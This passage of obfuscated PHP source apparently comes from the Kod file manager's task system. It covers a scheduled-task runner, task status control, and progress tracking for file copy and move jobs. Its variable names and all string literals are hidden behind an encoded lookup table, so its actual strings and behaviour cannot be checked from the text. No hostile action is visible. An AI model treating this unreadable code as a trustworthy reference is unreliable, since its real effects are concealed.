>= $ùìòåêÆ) { break; } } } private static function taskTimeCheck($«åØæ©¾) { $«Û…×Œú =& $_SERVER[ì…™Î¶Ï]; $áÏ´¹‰ê = json_decode($«åØæ©¾[$«Û…×Œú[196]], !0); $É¨ÁïÏ = intval($«åØæ©¾[$«Û…×Œú[1592]]); $™·Ù¿Œô = strtotime($«Û…×Œú[1603] . $áÏ´¹‰ê[$«Û…×Œú[1604]] . $«Û…×Œú[1605]) - strtotime($«Û…×Œú[1606]); $ÃÄ½¾Ù€ = time() - strtotime(date($«Û…×Œú[1607]) . $«Û…×Œú[1608]); $ûøğµ¡› = $ÃÄ½¾Ù€ >= $™·Ù¿Œô && $ÃÄ½¾Ù€ <= $™·Ù¿Œô + 3600; switch ($áÏ´¹‰ê[$«Û…×Œú[33]]) { case $«Û…×Œú[1609]: if (time() - $É¨ÁïÏ < 3600 * 24 * 30) { return !1; } if ($áÏ´¹‰ê[$«Û…×Œú[1609]] == date($«Û…×Œú[1610]) && $ûøğµ¡›) { return !0; } break; case $«Û…×Œú[1611]: if (time() - $É¨ÁïÏ < 3600 * 24 * 7) { return !1; } $ŒŒ„¹ô = date($«Û…×Œú[1612]) == 0 ? 7 : date($«Û…×Œú[1612]); if ($áÏ´¹‰ê[$«Û…×Œú[1611]] == $ŒŒ„¹ô && $ûøğµ¡›) { return !0; } break; case $«Û…×Œú[1604]: if (time() - $É¨ÁïÏ < 3600 * 24) { return !1; } if ($ûøğµ¡›) { return !0; } break; case $«Û…×Œú[1613]: if (time() - $É¨ÁïÏ >= floatval($áÏ´¹‰ê[$«Û…×Œú[1613]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $§¬…†ÛĞ =& $_SERVER[ì…™Î¶Ï]; static $ÎŞŠ©’ = 0; $Â˜ĞïŒê = 300; if (!$ÎŞŠ©’) { $ÎŞŠ©’ = time(); } if (time() - $ÎŞŠ©’ < $Â˜ĞïŒê) { return; } $ÎŞŠ©’ = time(); $ÆòÏ¼Ÿ£ = Model($§¬…†ÛĞ[504])->db($§¬…†ÛĞ[12]); if ($ÆòÏ¼Ÿ£) { $ÆòÏ¼Ÿ£->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($§¬…†ÛĞ[1614], $§¬…†ÛĞ[1615]); die; } } public static function taskRun($ø™­ÔëŸ) { $Ş©éŸ =& $_SERVER[ì…™Î¶Ï]; self::log($Ş©éŸ[1616] . $ø™­ÔëŸ[$Ş©éŸ[392]] . $Ş©éŸ[1617] . $ø™­ÔëŸ[$Ş©éŸ[32]] . $Ş©éŸ[1618] . $ø™­ÔëŸ[$Ş©éŸ[1619]]); Model($Ş©éŸ[1600])->run($ø™­ÔëŸ[$Ş©éŸ[392]]); $ä¤ˆ¯èø = timeFloat(); $œŞÂ³ïû = $Ş©éŸ[12]; switch ($ø™­ÔëŸ[$Ş©éŸ[33]]) { case $Ş©éŸ[302]: $ä†‡¤ò„ = url_request($ø™­ÔëŸ[$Ş©éŸ[1619]], $Ş©éŸ[225], !1, !1, !1, !1, 10); if ($ä†‡¤ò„[$Ş©éŸ[725]]) { $œŞÂ³ïû = strlen($ä†‡¤ò„[$Ş©éŸ[1167]]); } break; case $Ş©éŸ[224]: $œŞÂ³ïû = Hook::apply($ø™­ÔëŸ[$Ş©éŸ[1619]]); default: break; } Model($Ş©éŸ[1620])->add(array($Ş©éŸ[1621] => $Ş©éŸ[12], $Ş©éŸ[1622] => $Ş©éŸ[190], $Ş©éŸ[33] => $Ş©éŸ[1623] . $ø™­ÔëŸ[$Ş©éŸ[392]], $Ş©éŸ[1624] => json_encode(array($Ş©éŸ[32] => $ø™­ÔëŸ[$Ş©éŸ[32]], $Ş©éŸ[1625] => timeFloat() - $ä¤ˆ¯èø, $Ş©éŸ[288] => $œŞÂ³ïû)))); $Œ¦ŒÄ×À = $œŞÂ³ïû ? $Ş©éŸ[1626] . $œŞÂ³ïû : $Ş©éŸ[12]; self::log($Ş©éŸ[1627] . $ø™­ÔëŸ[$Ş©éŸ[392]] . $Ş©éŸ[527] . $Œ¦ŒÄ×À); return !0; } private static function valueGet($ùÓçí’ä) { $å÷ˆò’Ï =& $_SERVER[ì…™Î¶Ï]; $Œ×«¹ù— = $å÷ˆò’Ï[1628]; $÷ï°°ü = Model($å÷ˆò’Ï[424])->get($ùÓçí’ä, $Œ×«¹ù—); if (is_null($÷ï°°ü)) { Model($å÷ˆò’Ï[424])->set($å÷ˆò’Ï[725], $å÷ˆò’Ï[89], $Œ×«¹ù—); Model($å÷ˆò’Ï[424])->set($å÷ˆò’Ï[1591], $å÷ˆò’Ï[190], $Œ×«¹ù—); $÷ï°°ü = Model($å÷ˆò’Ï[424])->get($ùÓçí’ä, $Œ×«¹ù—); } return $÷ï°°ü; } private static function valueSet($öÎˆÁ×, $¸¼¤–¡ğ) { $ÏÚÑ¶ô =& $_SERVER[ì…™Î¶Ï]; $‰¼ Å¬˜ = $ÏÚÑ¶ô[1629]; CacheLock::lock($‰¼ Å¬˜); $»Ú‘ä¾ì = Model($ÏÚÑ¶ô[424])->set($öÎˆÁ×, $¸¼¤–¡ğ, $ÏÚÑ¶ô[1628]); CacheLock::unlock($‰¼ Å¬˜); return $»Ú‘ä¾ì; } protected static function log($Å¿ìœê) { write_log($Å¿ìœê, $_SERVER[ì…™Î¶Ï][1615]); } private static function cacheClear() { $ÏË°’Ï =& $_SERVER[ì…™Î¶Ï]; Cache::clearMemory(Model($ÏË°’Ï[424])->cacheKey($ÏË°’Ï[1628])); Cache::clearMemory(Model($ÏË°’Ï[424])->cacheKey($ÏË°’Ï[1630])); Model($ÏË°’Ï[1600])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($ˆº¨Òµ¡, $¹«°õ³ú = '', $´’ÚÀ = 0, $ìË¯Äş¡ = '') { $‹ûÓâğ =& $_SERVER[ì…™Î¶Ï]; if (self::get($ˆº¨Òµ¡)) { return; } $this->task = array($‹ûÓâğ[392] => $ˆº¨Òµ¡, $‹ûÓâğ[1631] => USER_ID, $‹ûÓâğ[1531] => $ìË¯Äş¡, $‹ûÓâğ[33] => $¹«°õ³ú, $‹ûÓâğ[1040] => $‹ûÓâğ[12], $‹ûÓâğ[761] => $´’ÚÀ, $‹ûÓâğ[1632] => 0, $‹ûÓâğ[1633] => 0, $‹ûÓâğ[1634] => 0, $‹ûÓâğ[1635] => timeFloat(), $‹ûÓâğ[1636] => 0, $‹ûÓâğ[1637] => 0, $‹ûÓâğ[1638] => 0, $‹ûÓâğ[1639] => 0, $‹ûÓâğ[725] => $‹ûÓâğ[1591]); $GLOBALS[$‹ûÓâğ[1640]] = 1; Hook::bind($‹ûÓâğ[1594], array($this, $‹ûÓâğ[1641])); Hook::bind($‹ûÓâğ[1642], array($this, $‹ûÓâğ[1643])); $this->startAfter(); Hook::trigger($‹ûÓâğ[1644], $this->task); $this->task[$‹ûÓâğ[1637]] = timeFloat(); } public function end() { $ıÕ¬íÓ™ =& $_SERVER[ì…™Î¶Ï]; if (!$this->task) { return; } if ($this->task[$ıÕ¬íÓ™[1637]]) { self::valueSet($this->task[$ıÕ¬íÓ™[392]], !1); } $²½ã¾Ã = timeFloat() - $this->task[$ıÕ¬íÓ™[1635]]; self::log($ıÕ¬íÓ™[1645] . $this->task[$ıÕ¬íÓ™[392]] . $ıÕ¬íÓ™[1646] . $²½ã¾Ã . $ıÕ¬íÓ™[1647]); Hook::unbind($ıÕ¬íÓ™[1594], array($this, $ıÕ¬íÓ™[1641])); Hook::unbind($ıÕ¬íÓ™[1642], array($this, $ıÕ¬íÓ™[1643])); $this->endAfter(); $this->task = !1; } public function update($Ò«ÓÇÉÀ = 0, $§òÄ‰–° = false) { $€œüÙÈ =& $_SERVER[ì…™Î¶Ï]; $Ÿ›Ã§œ =& $this->task; if (!$Ÿ›Ã§œ) { return; } $Ÿ›Ã§œ[$€œüÙÈ[1632]] += $Ò«ÓÇÉÀ; $Ÿ›Ã§œ[$€œüÙÈ[1636]] = timeFloat(); if ($Ÿ›Ã§œ[$€œüÙÈ[761]]) { if ($Ÿ›Ã§œ[$€œüÙÈ[761]] < $Ÿ›Ã§œ[$€œüÙÈ[1632]]) { $Ÿ›Ã§œ[$€œüÙÈ[761]] = $Ÿ›Ã§œ[$€œüÙÈ[1632]]; } $ÊåüëÂ = timeFloat() - $Ÿ›Ã§œ[$€œüÙÈ[1635]] - $Ÿ›Ã§œ[$€œüÙÈ[1638]]; $Ÿ›Ã§œ[$€œüÙÈ[1633]] = $Ÿ›Ã§œ[$€œüÙÈ[1632]] / $Ÿ›Ã§œ[$€œüÙÈ[761]]; $Ÿ›Ã§œ[$€œüÙÈ[1634]] = $Ÿ›Ã§œ[$€œüÙÈ[1632]] / $ÊåüëÂ; if ($Ÿ›Ã§œ[$€œüÙÈ[1633]] > 0) { $Ÿ›Ã§œ[$€œüÙÈ[1639]] = $ÊåüëÂ * (1 - $Ÿ›Ã§œ[$€œüÙÈ[1633]]) / $Ÿ›Ã§œ[$€œüÙÈ[1633]]; } $Ÿ›Ã§œ[$€œüÙÈ[1639]] = $Ÿ›Ã§œ[$€œüÙÈ[1639]] <= 0 ? 0 : $Ÿ›Ã§œ[$€œüÙÈ[1639]]; } $this->updateAfter(); $Ü…†·¾Ç = 0.2; if (timeFloat() - $Ÿ›Ã§œ[$€œüÙÈ[1637]] < $Ü…†·¾Ç && !$§òÄ‰–°) { return; } $êÆµÀÂÈ = self::get($Ÿ›Ã§œ[$€œüÙÈ[392]]); $¾¡Ë¢Ñö = $êÆµÀÂÈ[$€œüÙÈ[725]]; if ($¾¡Ë¢Ñö == self::STATYS_KILL) { $É”Š³¾ = array($€œüÙÈ[1648] => LNG($€œüÙÈ[1649]), $€œüÙÈ[1165] => !1); Cache::set($€œüÙÈ[1650] . $this->task[$€œüÙÈ[392]], $É”Š³¾, 30); $this->onKill(); $this->end(); die; } else { if ($¾¡Ë¢Ñö == self::STATYS_STOP) { $×® ˜õˆ = 2; $êÆµÀÂÈ[$€œüÙÈ[1638]] += $×® ˜õˆ; self::valueSet($Ÿ›Ã§œ[$€œüÙÈ[392]], $êÆµÀÂÈ); sleep($×® ˜õˆ); $this->update(); return; } } $Ÿ›Ã§œ[$€œüÙÈ[725]] = $¾¡Ë¢Ñö ? $¾¡Ë¢Ñö : $Ÿ›Ã§œ[$€œüÙÈ[725]]; $Ÿ›Ã§œ[$€œüÙÈ[1638]] = $êÆµÀÂÈ[$€œüÙÈ[1638]] ? $êÆµÀÂÈ[$€œüÙÈ[1638]] : 0; $Ÿ›Ã§œ[$€œüÙÈ[1637]] = timeFloat(); Hook::trigger($€œüÙÈ[1651], $Ÿ›Ã§œ); self::valueSet($Ÿ›Ã§œ[$€œüÙÈ[392]], $Ÿ›Ã§œ); } public function onKillSet($ä“¤ŒÄ’, $®¾àú”  = array()) { $this->onKillCall = array($ä“¤ŒÄ’, $®¾àú” ); } public function onKill() { $…‡É´£ =& $_SERVER[ì…™Î¶Ï]; self::log($…‡É´£[1645] . $this->task[$…‡É´£[392]] . $…‡É´£[1652]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÅÑúí¬ã) { $ÙÌëÔ„° =& $_SERVER[ì…™Î¶Ï]; Cache::set($ÙÌëÔ„°[1650] . $this->task[$ÙÌëÔ„°[392]], $ÅÑúí¬ã, 60); return $ÅÑúí¬ã; } public static function get($€ÀÏÓ½³) { $Íò×å®Œ =& $_SERVER[ì…™Î¶Ï]; $·Ò‘İ”à = self::valueGet($€ÀÏÓ½³); if (is_array($·Ò‘İ”à) && $·Ò‘İ”à[$Íò×å®Œ[1653]]) { $¤×“ÅÓ = ActionApply($·Ò‘İ”à[$Íò×å®Œ[1653]], array($·Ò‘İ”à)); $·Ò‘İ”à = is_array($¤×“ÅÓ) ? $¤×“ÅÓ : $·Ò‘İ”à; } return $·Ò‘İ”à; } public static function listData() { $–¿Öß™Ö = self::valueGet(); return array_sort_by($–¿Öß™Ö, $_SERVER[ì…™Î¶Ï][1635], !0); } public static function kill($İÔ«ö†) { return self::changeStatus($İÔ«ö†, self::STATYS_KILL); } public static function stop($ËùÚÍ¦×) { return self::changeStatus($ËùÚÍ¦×, self::STATYS_STOP); } public static function restart($çõîê¯) { return self::changeStatus($çõîê¯, self::STATYS_RUNNING); } public static function killAll() { $ú£‘©ëÓ =& $_SERVER[ì…™Î¶Ï]; $ô¨ô¯˜ƒ = self::listData(); foreach ($ô¨ô¯˜ƒ as $âìÀ»ÀÛ) { self::kill($âìÀ»ÀÛ[$ú£‘©ëÓ[392]]); } sleep(2); foreach ($ô¨ô¯˜ƒ as $âìÀ»ÀÛ) { self::valueSet($âìÀ»ÀÛ[$ú£‘©ëÓ[392]], !1); } } private static function changeStatus($ºÇ¥ª‡õ, $ÌÈóşğ) { $Ù«‘ËÙÖ =& $_SERVER[ì…™Î¶Ï]; $¥†¼ö · = self::valueGet($ºÇ¥ª‡õ); if (!$¥†¼ö ·) { return !1; } $¥†¼ö ·[$Ù«‘ËÙÖ[725]] = $ÌÈóşğ; self::valueSet($ºÇ¥ª‡õ, $¥†¼ö ·); self::log($Ù«‘ËÙÖ[1654] . $¥†¼ö ·[$Ù«‘ËÙÖ[392]] . $Ù«‘ËÙÖ[1655] . $ÌÈóşğ); return !0; } public static function valueGet($÷ÚÄ† = false) { $¤ÚØë =& $_SERVER[ì…™Î¶Ï]; if ($÷ÚÄ†) { $šºµëç™ = Model($¤ÚØë[436])->where(array($¤ÚØë[95] => $÷ÚÄ†, $¤ÚØë[33] => $¤ÚØë[1047]))->find(); return $šºµëç™ ? json_decode($šºµëç™[$¤ÚØë[369]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($íüÜªøÚ = false) { $“İê£°û =& $_SERVER[ì…™Î¶Ï]; $êÁŒé½ä = array($“İê£°û[33] => $“İê£°û[1047]); if ($íüÜªøÚ) { $êÁŒé½ä[$“İê£°û[1631]] = $íüÜªøÚ; } $–•Ä¯ã = Model($“İê£°û[436])->where($êÁŒé½ä)->select(); $–•Ä¯ã = $–•Ä¯ã ? $–•Ä¯ã : array(); foreach ($–•Ä¯ã as $Ä‰ûöú => $ô³Ö‡«Ğ) { $–•Ä¯ã[$Ä‰ûöú] = json_decode($ô³Ö‡«Ğ[$“İê£°û[369]], !0); } return $–•Ä¯ã; } public static function valueSet($½üõûòŒ, $Ğø˜ßÅâ) { $áÚ’¢ç =& $_SERVER[ì…™Î¶Ï]; if (!$Ğø˜ßÅâ) { return Model($áÚ’¢ç[436])->where(array($áÚ’¢ç[95] => $½üõûòŒ, $áÚ’¢ç[33] => $áÚ’¢ç[1047]))->delete(); } $ôËà­¶¿ = json_encode($Ğø˜ßÅâ); if (!$ôËà­¶¿) { ob_start(); var_dump($Ğø˜ßÅâ); $ ÅÈåŸ˜ = ob_get_clean(); self::log($áÚ’¢ç[1656] . json_encode_force($ ÅÈåŸ˜)); } if (!$½üõûòŒ || !$Ğø˜ßÅâ[$áÚ’¢ç[392]]) { return !1; } $ä’¯Æ©™ = array($áÚ’¢ç[33] => $áÚ’¢ç[1047], $áÚ’¢ç[1631] => USER_ID, $áÚ’¢ç[95] => $½üõûòŒ, $áÚ’¢ç[369] => $ôËà­¶¿); $ÆâÚˆ‡ = $áÚ’¢ç[1657]; CacheLock::lock($ÆâÚˆ‡); Model($áÚ’¢ç[436])->add($ä’¯Æ©™, array(), !0); CacheLock::unlock($ÆâÚˆ‡); } public static function log($Èà®‡Œ¹) { if (!GLOBAL_DEBUG) { return; } write_log($Èà®‡Œ¹, $_SERVER[ì…™Î¶Ï][1658]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÜÁ×ı =& $_SERVER[ì…™Î¶Ï]; $Ö›ÀÑ¾Š =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÜÁ×ı[1659], array($this, $ÜÁ×ı[1660])); Hook::bind($ÜÁ×ı[1189], array($this, $ÜÁ×ı[1661])); Hook::bind($ÜÁ×ı[1662], array($this, $ÜÁ×ı[1663])); Hook::bind($ÜÁ×ı[589], array($this, $ÜÁ×ı[1664])); Hook::bind($ÜÁ×ı[590], array($this, $ÜÁ×ı[1665])); Hook::bind($ÜÁ×ı[592], array($this, $ÜÁ×ı[1666])); Hook::bind($ÜÁ×ı[593], array($this, $ÜÁ×ı[1666])); Hook::bind($ÜÁ×ı[559], array($this, $ÜÁ×ı[1667])); Hook::bind($ÜÁ×ı[556], array($this, $ÜÁ×ı[1667])); Hook::bind($ÜÁ×ı[561], array($this, $ÜÁ×ı[1667])); Hook::bind($ÜÁ×ı[563], array($this, $ÜÁ×ı[1667])); Hook::bind($ÜÁ×ı[565], array($this, $ÜÁ×ı[1667])); Hook::bind($ÜÁ×ı[1668], array($this, $ÜÁ×ı[1669])); Hook::bind($ÜÁ×ı[582], array($this, $ÜÁ×ı[1670])); $this->sourceModelCopyFlag = !1; Hook::bind($ÜÁ×ı[1671], array($this, $ÜÁ×ı[1672])); Hook::bind($ÜÁ×ı[1673], array($this, $ÜÁ×ı[1674])); Hook::bind($ÜÁ×ı[1675], array($this, $ÜÁ×ı[1676])); $Ö›ÀÑ¾Š[$ÜÁ×ı[1677]] = LNG($ÜÁ×ı[1678]); $Ö›ÀÑ¾Š[$ÜÁ×ı[1679]] = 0; $Ö›ÀÑ¾Š[$ÜÁ×ı[1680]] = 0; $Ö›ÀÑ¾Š[$ÜÁ×ı[1040]] = $ÜÁ×ı[12]; $Ö›ÀÑ¾Š[$ÜÁ×ı[1681]] = $ÜÁ×ı[12]; $Ö›ÀÑ¾Š[$ÜÁ×ı[1682]] = 0; $Ö›ÀÑ¾Š[$ÜÁ×ı[1683]] = 0; $Ö›ÀÑ¾Š[$ÜÁ×ı[1684]] = 0; if (!$Ö›ÀÑ¾Š[$ÜÁ×ı[1531]]) { $Ö›ÀÑ¾Š[$ÜÁ×ı[1531]] = LNG($ÜÁ×ı[1685]); } } protected function endAfter() { $ƒÊŠ”Î =& $_SERVER[ì…™Î¶Ï]; Hook::unbind($ƒÊŠ”Î[1659], array($this, $ƒÊŠ”Î[1660])); Hook::unbind($ƒÊŠ”Î[1189], array($this, $ƒÊŠ”Î[1661])); Hook::unbind($ƒÊŠ”Î[1662], array($this, $ƒÊŠ”Î[1663])); Hook::unbind($ƒÊŠ”Î[589], array($this, $ƒÊŠ”Î[1664])); Hook::unbind($ƒÊŠ”Î[590], array($this, $ƒÊŠ”Î[1665])); Hook::unbind($ƒÊŠ”Î[592], array($this, $ƒÊŠ”Î[1666])); Hook::unbind($ƒÊŠ”Î[593], array($this, $ƒÊŠ”Î[1666])); Hook::unbind($ƒÊŠ”Î[559], array($this, $ƒÊŠ”Î[1667])); Hook::unbind($ƒÊŠ”Î[556], array($this, $ƒÊŠ”Î[1667])); Hook::unbind($ƒÊŠ”Î[561], array($this, $ƒÊŠ”Î[1667])); Hook::unbind($ƒÊŠ”Î[563], array($this, $ƒÊŠ”Î[1667])); Hook::unbind($ƒÊŠ”Î[565], array($this, $ƒÊŠ”Î[1667])); Hook::unbind($ƒÊŠ”Î[1668], array($this, $ƒÊŠ”Î[1669])); Hook::unbind($ƒÊŠ”Î[582], array($this, $ƒÊŠ”Î[1670])); Hook::unbind($ƒÊŠ”Î[1671], array($this, $ƒÊŠ”Î[1672])); Hook::unbind($ƒÊŠ”Î[1673], array($this, $ƒÊŠ”Î[1674])); Hook::unbind($ƒÊŠ”Î[1675], array($this, $ƒÊŠ”Î[1676])); } public function copyMoveStart($ÖÔÎ–…û, $¨ñ–ˆÓŞ, $î«æÒË¡, $Í“°ØüË) { $ûÒÁÕ½Å =& $_SERVER[ì…™Î¶Ï]; self::log($ûÒÁÕ½Å[1686] . $¨ñ–ˆÓŞ . $ûÒÁÕ½Å[70] . $Í“°ØüË); $ô›¤­—« = rtrim(TEMP_FILES, $ûÒÁÕ½Å[8]); if (substr($¨ñ–ˆÓŞ, 0, strlen($ô›¤­—«)) == $ô›¤­—«) { return; } if (substr($Í“°ØüË, 0, strlen($ô›¤­—«)) == $ô›¤­—«) { return; } $Üê’ûÓ =& $this->task; $Üê’ûÓ[$ûÒÁÕ½Å[1687]] = KodIO::transferType($ÖÔÎ–…û, $î«æÒË¡); $this->update(); } public function updateAfter() { $„äòøûœ =& $_SERVER[ì…™Î¶Ï]; $Ñ±Ñ¸Ë— =& $this->task; if (!$Ñ±Ñ¸Ë—[$„äòøûœ[738]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ñ±Ñ¸Ë—[$„äòøûœ[1687]] == $„äòøûœ[1278]) { return; } self::updateTask($Ñ±Ñ¸Ë—); } private static function updateTask(&$ÇãîŸ ®) { $¶›­ÕÊÌ =& $_SERVER[ì…™Î¶Ï]; if ($ÇãîŸ ®[$¶›­ÕÊÌ[1687]] == $¶›­ÕÊÌ[1173] || $ÇãîŸ ®[$¶›­ÕÊÌ[1687]] == $¶›­ÕÊÌ[108]) { if ($ÇãîŸ ®[$¶›­ÕÊÌ[1681]]) { $ÇãîŸ ®[$¶›­ÕÊÌ[1684]] = $ÇãîŸ ®[$¶›­ÕÊÌ[1683]] + $ÇãîŸ ®[$¶›­ÕÊÌ[1680]]; } } else { if ($ÇãîŸ ®[$¶›­ÕÊÌ[1687]] == $¶›­ÕÊÌ[1279]) { if ($ÇãîŸ ®[$¶›­ÕÊÌ[1681]] == $¶›­ÕÊÌ[1173]) { $ÇãîŸ ®[$¶›­ÕÊÌ[1684]] = $ÇãîŸ ®[$¶›­ÕÊÌ[1683]] + $ÇãîŸ ®[$¶›­ÕÊÌ[1680]] * 0.5; } else { if ($ÇãîŸ ®[$¶›­ÕÊÌ[1681]] == $¶›­ÕÊÌ[108]) { $ÇãîŸ ®[$¶›­ÕÊÌ[1684]] = $ÇãîŸ ®[$¶›­ÕÊÌ[1683]] + $ÇãîŸ ®[$¶›­ÕÊÌ[1679]] * 0.5 + $ÇãîŸ ®[$¶›­ÕÊÌ[1680]] * 0.5; } } } } $ÇãîŸ ®[$¶›­ÕÊÌ[1633]] = $ÇãîŸ ®[$¶›­ÕÊÌ[1684]] / $ÇãîŸ ®[$¶›­ÕÊÌ[738]]; if ($ÇãîŸ ®[$¶›­ÕÊÌ[1633]] > 0) { $¸³ÎÃ”½ = timeFloat() - $ÇãîŸ ®[$¶›­ÕÊÌ[1635]] - $ÇãîŸ ®[$¶›­ÕÊÌ[1638]]; $ÇãîŸ ®[$¶›­ÕÊÌ[1639]] = $¸³ÎÃ”½ * (1 - $ÇãîŸ ®[$¶›­ÕÊÌ[1633]]) / $ÇãîŸ ®[$¶›­ÕÊÌ[1633]]; } } public function addPath($êª×²Ï¨) { $ ›ŸŞ =& $_SERVER[ì…™Î¶Ï]; if (!$êª×²Ï¨) { return; } $Õ€¹éã =& $this->task; $±‚¯Ğ¢† = IO::infoWithChildren($êª×²Ï¨); $¢µÒã½– = $Õ€¹éã[$ ›ŸŞ[1688]] ? $Õ€¹éã[$ ›ŸŞ[1688]][$ ›ŸŞ[1689]] : 0; $Õ€¹éã[$ ›ŸŞ[1688]] = array($ ›ŸŞ[1689] => $¢µÒã½– + 1, $ ›ŸŞ[412] => $±‚¯Ğ¢†[$ ›ŸŞ[32]], $ ›ŸŞ[78] => $±‚¯Ğ¢†[$ ›ŸŞ[78]], $ ›ŸŞ[510] => $±‚¯Ğ¢†[$ ›ŸŞ[510]] ? $±‚¯Ğ¢†[$ ›ŸŞ[510]] : $±‚¯Ğ¢†[$ ›ŸŞ[78]]); if ($±‚¯Ğ¢†[$ ›ŸŞ[33]] == $ ›ŸŞ[192]) { $Õ€¹éã[$ ›ŸŞ[761]] += 1; } else { $Õ€¹éã[$ ›ŸŞ[761]] += $±‚¯Ğ¢†[$ ›ŸŞ[83]][$ ›ŸŞ[81]]; if ($±‚¯Ğ¢†[$ ›ŸŞ[394]]) { $Õ€¹éã[$ ›ŸŞ[761]] += $±‚¯Ğ¢†[$ ›ŸŞ[83]][$ ›ŸŞ[82]] + 1; } } $Õ€¹éã[$ ›ŸŞ[738]] += $±‚¯Ğ¢†[$ ›ŸŞ[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($ÔÕ˜¤½Ÿ) { $«Ò´Øñè =& $_SERVER[ì…™Î¶Ï]; $¿á›åİª =& $this->task; $¿á›åİª[$«Ò´Øñè[1677]] = $ÔÕ˜¤½Ÿ[$«Ò´Øñè[32]]; $¿á›åİª[$«Ò´Øñè[1040]] = $ÔÕ˜¤½Ÿ[$«Ò´Øñè[32]]; $this->update(); } public function copyFileStart($ëùºÃ¥â, $£“˜Í”Í, $ì¨•Ğ£Ä, $¬ì‡ì®, $„ÅÇÁ±¡, $èõÆÔŞ ) { $ä«Á¨¤è =& $_SERVER[ì…™Î¶Ï]; $ò‚‡¾È = $„ÅÇÁ±¡; if ($ò‚‡¾È == $GLOBALS[$ä«Á¨¤è[1690]]) { $ò‚‡¾È = $GLOBALS[$ä«Á¨¤è[1691]]; } $GLOBALS[$ä«Á¨¤è[1691]] = $„ÅÇÁ±¡; $GLOBALS[$ä«Á¨¤è[1690]] = $èõÆÔŞ ; $¥²„“Â =& $this->task; $¥²„“Â[$ä«Á¨¤è[1677]] = $ò‚‡¾È; $¥²„“Â[$ä«Á¨¤è[1679]] = (int) $ëùºÃ¥â->size($£“˜Í”Í); $¥²„“Â[$ä«Á¨¤è[1680]] = 0; $¥²„“Â[$ä«Á¨¤è[1040]] = $ä«Á¨¤è[12]; $¥²„“Â[$ä«Á¨¤è[1681]] = $ä«Á¨¤è[12]; $¥²„“Â[$ä«Á¨¤è[1682]] = 0; $÷»Ñ® = $¥²„“Â[$ä«Á¨¤è[1679]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¥²„“Â[$ä«Á¨¤è[392]] . $ä«Á¨¤è[1692]); if ($÷»Ñ® && file_exists(get_path_father($¬ì‡ì®))) { Cache::set($¥²„“Â[$ä«Á¨¤è[392]] . $ä«Á¨¤è[1692], $¬ì‡ì®); $¥²„“Â[$ä«Á¨¤è[1653]] = array($ä«Á¨¤è[1693], $ä«Á¨¤è[1694]); } $this->update(0, $÷»Ñ®); } public static function updateCopyLocalFileSize($à’Ëß‡§) { $™ğ¡¬šê =& $_SERVER[ì…™Î¶Ï]; $²ğÙ—Í¹ = Cache::get($à’Ëß‡§[$™ğ¡¬šê[392]] . $™ğ¡¬šê[1692]); if (!$²ğÙ—Í¹ || !file_exists($²ğÙ—Í¹)) { return $à’Ëß‡§; } $à’Ëß‡§[$™ğ¡¬šê[1680]] = @filesize($²ğÙ—Í¹); $à’Ëß‡§[$™ğ¡¬šê[1684]] += $à’Ëß‡§[$™ğ¡¬šê[1680]]; self::updateTask($à’Ëß‡§); return $à’Ëß‡§; } public function copyFileEnd($ÒÇ‡×, $êİÏëÇ·, $ÑğãËš, $µÔÜ†àÃ, $Ïşƒ¢–, $öË£÷¿) { $¦ª¨ìÉï =& $_SERVER[ì…™Î¶Ï]; $‚ŞÑÁÚ =& $this->task; $‚ŞÑÁÚ[$¦ª¨ìÉï[1680]] = $‚ŞÑÁÚ[$¦ª¨ìÉï[1679]]; $‚ŞÑÁÚ[$¦ª¨ìÉï[1681]] = $¦ª¨ìÉï[12]; unset($‚ŞÑÁÚ[$¦ª¨ìÉï[1653]]); if ($Ïşƒ¢– == $‚ŞÑÁÚ[$¦ª¨ìÉï[1677]]) { $‚ŞÑÁÚ[$¦ª¨ìÉï[1683]] += $‚ŞÑÁÚ[$¦ª¨ìÉï[1679]]; $‚ŞÑÁÚ[$¦ª¨ìÉï[1684]] = $‚ŞÑÁÚ[$¦ª¨ìÉï[1683]]; $this->update(1); } else { $this->update(); $‚ŞÑÁÚ[$¦ª¨ìÉï[1680]] = 0; } Cache::remove($‚ŞÑÁÚ[$¦ª¨ìÉï[392]] . $¦ª¨ìÉï[1692]); self::log($¦ª¨ìÉï[1695] . $êİÏëÇ· . $¦ª¨ìÉï[70] . $µÔÜ†àÃ . $¦ª¨ìÉï[226] . $Ïşƒ¢– . $¦ª¨ìÉï[1696] . $‚ŞÑÁÚ[$¦ª¨ìÉï[1677]]); } public function updateFileEnd($Ñø¢±ß, $ÀÄ™ÚÏÒ) { $µ›¡ôàñ =& $_SERVER[ì…™Î¶Ï]; $¼ÇõÒÒ =& $this->task; $¼ÇõÒÒ[$µ›¡ôàñ[1677]] = $Ñø¢±ß; $¼ÇõÒÒ[$µ›¡ôàñ[1679]] = $ÀÄ™ÚÏÒ; $¼ÇõÒÒ[$µ›¡ôàñ[1683]] += $ÀÄ™ÚÏÒ; $¼ÇõÒÒ[$µ›¡ôàñ[1684]] = $¼ÇõÒÒ[$µ›¡ôàñ[1683]]; $this->update(1); self::log($µ›¡ôàñ[1697] . $Ñø¢±ß); } public function sourceModelCopy($ƒêöâÙ‰) { $Ô€™ª÷û =& $_SERVER[ì…™Î¶Ï]; $Æ¾©‡âÈ = $ƒêöâÙ‰[0]; $ÃŒæé¿¾ = $ƒêöâÙ‰[1]; $Ûó’“• =& $this->task; $this->sourceModelCopyFlag = !0; $€»û‰±« = 0; switch ($Æ¾©‡âÈ) { case $Ô€™ª÷û[557]: $€»û‰±« = 1; break; case $Ô€™ª÷û[560]: $Ûó’“•[$Ô€™ª÷û[1677]] = 